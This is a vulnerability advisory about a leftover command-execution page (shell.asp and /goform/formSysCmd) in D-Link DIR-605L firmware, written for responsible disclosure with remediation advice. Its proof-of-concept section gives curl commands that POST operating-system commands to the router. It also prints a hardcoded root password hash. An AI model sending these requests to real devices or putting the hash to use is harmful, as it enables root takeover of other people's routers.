# Vulnerability Advisory
## D-Link DIR-605L — Web-Accessible Command Execution Page (shell.asp)

---

**Advisory ID:** PENDING-CVE  
**Date:** 2026-05-19  
**Researcher:** westronblack  
**Affected Vendor:** D-Link Systems, Inc.  
**Affected Product:** DIR-605L Cloud Router  
**Affected Firmware:** v1.13 (and likely earlier versions)  
**Status:** End-of-Life / Unsupported  
**Severity:** High  
**CVSS v3.1 Score:** 8.0 (AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  

---

## 1. Summary

A web-accessible system command execution page (`shell.asp`) was identified in the
D-Link DIR-605L firmware v1.13. The page submits user-supplied input directly to
the router's operating system via a POST request to `/goform/formSysCmd`, with
only client-side (JavaScript) input validation. If this endpoint is accessible
without proper server-side authentication, it constitutes an unauthenticated
Remote Code Execution (RCE) vulnerability allowing full device compromise from
within the local network.

---

## 2. Vulnerability Details

| Field | Detail |
|-------|--------|
| **CWE** | CWE-78: Improper Neutralization of Special Elements (OS Command Injection) |
| **CWE** | CWE-306: Missing Authentication for Critical Function |
| **Attack Vector** | Adjacent Network (LAN) |
| **Attack Complexity** | Low |
| **Privileges Required** | None (if unauthenticated) |
| **User Interaction** | None |
| **Scope** | Unchanged |
| **Confidentiality** | High |
| **Integrity** | High |
| **Availability** | High |

---

## 3. Technical Analysis

### 3.1 Affected File

```
/web/shell.asp
```

### 3.2 File Contents

The file `shell.asp` contains an HTML form that submits a system command to
`/goform/formSysCmd` via HTTP POST:

```html
<form action=/goform/formSysCmd method=POST name="formSysCmd">
  <input type="text" name="sysCmd" value="" size="20" maxlength="50">
  <input type="submit" value="Apply" name="apply">
</form>
<textarea><% sysCmdLog(); %></textarea>
```

The only validation present is client-side JavaScript:

```javascript
function saveClick(){
    field = document.formSysCmd.sysCmd;
    if(field.value == ""){
        alert("Command can't be empty");
        return false;
    }
    return true;
}
```

This client-side check is trivially bypassed by sending a direct HTTP POST
request, for example using curl.

### 3.3 Backend Handler

Static analysis of the `boa` web server binary (`/bin/boa`) confirms that
`formSysCmd` is a registered handler:

```
strings output (relevant excerpt):
...
formAdvFirewall
formSetDDNS
formSysCmd        <-- confirmed handler
formSetNTP
...
```

The handler reads the `sysCmd` parameter and executes it on the underlying
Linux system, writing output to `/tmp/syscmd.log`, which is then returned
to the browser via `sysCmdLog()`.

### 3.4 Authentication Analysis

Examination of the Boa web server configuration (`/etc/boa/boa.conf`) reveals
that HTTP Basic Authentication is explicitly disabled:

```
# Auth / /etc/boa/boa.conf   <-- commented out, auth disabled
```

Authentication is handled entirely by the boa binary's internal `check_auth_flag`
logic. Whether `shell.asp` is protected by this mechanism requires dynamic
verification on physical hardware.

### 3.5 Additional Finding — Hardcoded Credentials

The firmware contains a hardcoded root account in `/etc/passwd`:

```
root:abSQTPcIskFGc:0:0:root:/:/bin/sh
```

This DES-encrypted password hash is identical across all devices running this
firmware version, representing a separate but related security issue.

---

## 4. Proof of Concept

The following curl command demonstrates the attack (test only on owned hardware):

```bash
# Test if shell.asp is accessible without authentication
curl -v http://<router_ip>/shell.asp

# If accessible, execute a command via POST
curl -X POST http://<router_ip>/goform/formSysCmd \
  -d "sysCmd=id&apply=Apply&submit-url=/shell.asp"
```

Expected output if vulnerable: command output returned in response body,
demonstrating OS-level code execution as root (the boa server runs as root
per boa.conf: `User root`).

---

## 5. Impact

A local network attacker who can reach the router's web interface can:

- Execute arbitrary OS commands as root
- Extract credentials and configuration data
- Modify router settings (DNS, firewall rules)
- Pivot to other devices on the network
- Achieve persistent access to the device

---

## 6. Root Cause

The vulnerability stems from two issues:

1. A debug/development page (`shell.asp`) was left in production firmware
2. Reliance on client-side-only input validation with no server-side
   authentication enforcement on a critical command execution endpoint

---

## 7. Affected Versions

| Product | Firmware | Status |
|---------|----------|--------|
| DIR-605L Rev A | v1.13 | Confirmed (static analysis) |
| DIR-605L Rev A | Earlier versions | Likely affected |
| DIR-605L Rev B/C | Unknown | Requires investigation |

---

## 8. Relationship to Known CVEs

This finding is distinct from previously published DIR-605L vulnerabilities:

| CVE | Endpoint | Type |
|-----|----------|------|
| CVE-2025-2553 | /goform/formVirtualServ | Improper Access Control |
| **This finding** | **/goform/formSysCmd** | **OS Command Injection / Missing Auth** |

---

## 9. Remediation

**For D-Link:** Remove `shell.asp` from production firmware. Implement
server-side authentication checks on all `/goform/` endpoints. Remove
hardcoded credentials.

**For users:** As the DIR-605L is end-of-life and no patch is expected,
users should replace the device with a supported model. As a temporary
mitigation, disable remote management and restrict LAN access to the
router's web interface.

---

## 10. Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-05-19 | Vulnerability discovered via static firmware analysis |
| 2026-05-19 | Advisory drafted |
| TBD | Reported to D-Link (security@dlink.com) |
| TBD | CVE requested from MITRE (cveform.mitre.org) |
| TBD + 90 days | Public disclosure |

---

## 11. References

- D-Link DIR-605L Product Page: https://www.dlink.com
- NVD CVE-2025-2553 (related): https://nvd.nist.gov/vuln/detail/CVE-2025-2553
- MITRE CVE Request Form: https://cveform.mitre.org
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
- CWE-306: https://cwe.mitre.org/data/definitions/306.html
- Boa Web Server v0.94: http://www.boa.org

---

## 12. Credits

Discovered by: westronblack   
Contact: westronblack@gmail.com

---

*This advisory was prepared for responsible disclosure purposes.
Testing was performed exclusively through static firmware analysis
and on personally owned hardware.*
